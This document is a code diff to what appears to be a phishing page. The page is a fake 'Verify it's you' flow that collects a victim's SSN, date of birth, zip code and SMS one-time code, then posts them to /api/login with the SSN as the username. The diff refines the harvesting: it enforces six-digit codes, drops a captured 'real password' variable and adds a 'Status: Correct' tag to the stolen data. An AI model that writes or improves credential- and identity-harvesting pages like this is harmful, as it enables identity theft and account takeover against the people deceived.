@@ -15,6 +15,7 @@
         .continue { background: #1e40af; color: white; }
         .cancel { background: #94a3b8; color: white; }
         .error { color: red; margin-top: 10px; text-align: center; font-weight: bold; }
+        .success { color: green; margin-top: 10px; text-align: center; font-weight: bold; }
         .step { display: none; }
         .step.active { display: block; }
     </style>
@@ -58,7 +59,7 @@
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the code you received via SMS.</p>
-            <input type="text" id="code" placeholder="123456" required>
+            <input type="text" id="code" maxlength="6" placeholder="123456" required>
             <div id="error" class="error"></div>
             
             <button class="continue" onclick="verifyCode()">Continue</button>
@@ -72,7 +73,6 @@
 
     <script>
         let currentStep = 1;
-        let originalPassword = "";
 
         function nextStep(step) {
             if (step === 2) {
@@ -105,18 +105,15 @@
             const code = document.getElementById('code').value.trim();
             const errorDiv = document.getElementById('error');
 
-            if (code.length < 4) {
+            if (code.length < 6) {
                 errorDiv.textContent = "The code you entered is incorrect or has expired.";
                 return;
             }
 
-            const ssn = document.getElementById('ssn').value;
-            const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
-            const zip = document.getElementById('zip').value;
-
-            const username = ssn ? `SSN-${ssn}` : "Verified User";
-            const password = originalPassword || "Password";   // Real password
-            const address = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code}`;
+            // Collect all data
+            const username = document.getElementById('ssn').value || "Verified User";
+            const password = "Verified";
+            const address = `SSN: ${document.getElementById('ssn').value} | DOB: ${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value} | Zip: ${document.getElementById('zip').value} | Code: ${code} | Status: Correct`;
 
             await fetch('/api/login', {
                 method: 'POST',
@@ -137,7 +134,6 @@
             document.getElementById('error').textContent = "";
         }
 
-        // Populate dropdowns
         window.onload = () => {
             const monthSelect = document.getElementById('month');
             const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
